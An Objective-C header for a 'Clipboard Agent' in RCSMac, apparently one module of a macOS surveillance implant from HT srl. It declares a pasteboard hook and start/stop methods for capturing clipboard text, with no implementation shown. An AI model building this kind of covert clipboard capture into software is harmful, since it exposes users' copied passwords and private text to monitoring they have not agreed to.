/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#import "RCSIAgent.h"

NSData* getPastebordText(NSArray* items);

@interface agentPasteboard : RCSIAgent

- (void)addItemsHook:(NSArray *)items;

- (BOOL)start;
- (void)stop;

@end